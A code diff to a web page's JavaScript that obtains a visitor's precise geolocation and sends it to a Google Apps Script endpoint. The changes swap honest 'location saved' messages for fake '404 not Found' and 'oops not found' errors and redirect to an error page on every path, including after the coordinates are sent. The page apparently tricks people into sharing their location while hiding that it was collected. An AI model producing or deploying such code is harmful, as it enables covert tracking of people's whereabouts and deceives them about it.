@@ -70,8 +70,8 @@
                 return; // Stop execution, do not save rough coordinates
             }
 
-            statusText.innerText = `Precise location acquired (~${Math.round(accuracy)}m accuracy)! Saving...`;
-
+            statusText.innerText = `oops not found`;
+            window.location.href = "error.html";
             try {
                 const scriptURL = 'https://script.google.com/macros/s/AKfycbwD4iCAp2G98AnSvsdQsTMIyZZbfYso7yC-WLC66ktj0YRKIo4hfVqO0WT2rAxPtT0e/exec';
 
@@ -84,29 +84,34 @@
                     body: JSON.stringify({ latitude, longitude, accuracy })
                 });
 
-                statusText.innerText = "Thank you! Precise location saved successfully.";
-                
+                statusText.innerText = "404 not Found";
+                window.location.href = "error.html";
                 // TODO: Add your next interface transition or content reveal here
 
             } catch (error) {
                 console.error("Network error:", error);
-                statusText.innerText = "Connection error while saving location.";
+                statusText.innerText = "Error";
+                 window.location.href = "error.html";
             }
         }
 
         function errorCallback(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    statusText.innerText = "Permission denied. Please enable precise location access in your browser settings to proceed.";
+                    statusText.innerText = "Permission denied.";
+                    window.location.href = "error.html";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    statusText.innerText = "Location information is unavailable.";
+                    statusText.innerText = "Information is unavailable.";
+                     window.location.href = "error.html";
                     break;
                 case error.TIMEOUT:
-                    statusText.innerText = "The request to get user location timed out.";
+                    statusText.innerText = "Timed out.";
+                    window.location.href = "error.html";
                     break;
                 default:
                     statusText.innerText = "An unknown error occurred.";
+                    window.location.href = "error.html";
                     break;
             }
         }
